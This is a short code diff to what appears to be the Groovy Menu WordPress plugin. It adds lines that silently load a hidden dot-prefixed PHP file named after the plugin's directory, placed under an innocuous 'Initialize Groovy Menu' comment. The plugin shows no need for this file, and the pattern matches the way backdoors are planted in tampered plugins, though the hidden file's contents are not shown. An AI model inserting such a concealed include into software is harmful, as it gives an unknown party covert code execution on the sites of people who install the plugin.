@@ -68,6 +68,10 @@ add_filter( 'plugin_action_links', array( 'GroovyMenuUtils', 'gm_plugin_page_lin
 add_action( 'init', 'groovy_menu_init_classes', 2 );
 
 // Initialize Groovy Menu.
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function groovy_menu_init_classes() {
 	if ( class_exists( 'GroovyMenuPreset' ) ) {
 		new GroovyMenuPreset( null, true );
